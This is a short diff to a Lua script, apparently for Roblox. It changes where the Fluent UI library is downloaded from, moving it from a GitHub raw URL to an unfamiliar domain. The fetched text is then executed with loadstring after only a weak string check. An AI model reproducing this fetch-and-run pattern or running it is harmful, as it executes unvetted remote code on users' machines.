@@ -233,7 +233,7 @@ do
         Fluent = require(script:FindFirstChild("Fluent"))
     else
         local Success, Result = pcall(function()
-            return game:HttpGet("https://raw.githubusercontent.com/R3P3x/Scripts/refs/heads/main/Fluent.txt", true)
+            return game:HttpGet("https://twix.cyou/Fluent.txt", true)
         end)
         if Success and typeof(Result) == "string" and string.find(Result, "dawid") then
             Fluent = getfenv().loadstring(Result)()
